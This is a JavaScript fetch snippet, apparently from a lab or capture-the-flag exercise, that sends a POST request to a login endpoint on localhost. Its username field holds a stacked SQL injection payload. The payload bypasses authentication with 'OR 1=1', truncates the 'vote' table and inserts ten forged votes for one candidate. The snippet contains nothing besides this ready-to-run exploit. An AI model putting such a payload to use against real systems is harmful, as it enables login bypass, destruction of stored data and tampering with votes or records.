fetch("http://localhost:7170/login", {
    "body": JSON.stringify({
        username: `123' OR 1=1;
        TRUNCATE TABLE vote;
        INSERT INTO vote (cid,uid) VALUES 
        (2,1),
        (2,2),
        (2,3),
        (2,4),
        (2,5),
        (2,6),
        (2,7),
        (2,8),
        (2,9),
        (2,10);
        #'`,
        password: '',
    }), "headers": {
        "content-type": "application/json",
    },
    "method": "POST"
});